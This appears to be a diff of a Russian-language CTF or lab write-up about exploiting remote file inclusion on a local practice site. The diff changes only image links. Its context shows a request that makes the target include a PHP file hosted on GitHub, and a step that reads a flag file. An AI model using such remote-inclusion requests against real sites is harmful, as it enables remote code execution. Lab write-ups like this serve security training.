@@ -62,7 +62,7 @@ docker-compose up
 ```http
 http://lang.local
 ```
-![](./img/photo_5269685033084515458_y.jpg)
+![](./img/photo_5269685033084515459_y.jpg)
 Видно что в ответ на запрос, вернулся страница в странице. Это явно намекает о наличии RFI.
 Для эксплуатации создадим файл на github со следующим содержимым:
 ```php
@@ -90,5 +90,5 @@ http://lang.local/index.php?lang=https://raw.githubusercontent.com/Truncheon-eng
 ```
 Получаем флаг из \/file.txt.
 КАРТИНКА
-
+![](./img/photo_5269685033084515458_y.jpg)
 [LFI_with_sess_poisoning](https://github.com/Truncheon-eng/LFI_with_sess_poisoning)
